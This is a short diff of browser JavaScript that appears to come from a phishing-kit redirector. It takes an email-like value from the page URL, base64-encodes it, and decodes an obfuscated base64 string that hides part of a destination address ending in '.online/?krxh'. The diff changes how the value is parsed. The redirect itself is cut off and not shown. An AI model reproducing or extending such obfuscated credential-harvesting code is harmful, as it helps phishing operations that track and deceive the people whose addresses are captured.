@@ -2,7 +2,7 @@
 
     if (window.location.hash) {
         var url = window.location.href;
-        var hash = url.split('?email=').pop();
+        var hash = url.split('?=').pop();
         const encdStr = 'Lm9ubGluZS8/a3J4aA==';
         const str = atob(encdStr);
         const encodedHash = btoa(hash); // Encode the hash using base64
